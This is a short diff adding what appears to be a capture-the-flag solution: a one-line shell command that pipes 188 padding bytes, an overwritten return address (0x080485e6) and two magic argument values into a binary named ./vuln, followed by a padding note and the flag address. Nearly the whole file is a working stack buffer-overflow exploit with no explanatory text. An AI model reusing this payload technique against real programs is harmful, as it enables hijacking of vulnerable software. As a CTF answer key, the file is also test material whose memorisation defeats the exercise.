@@ -1,0 +1,7 @@
+
+echo -n -e 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe6\x85\x04\x08aaaa\xef\xbe\xad\xde\x0d\xd0\xde\xc0'|./vuln
+(184+4)*'a'
+
+
+flag---0x080485e6
+
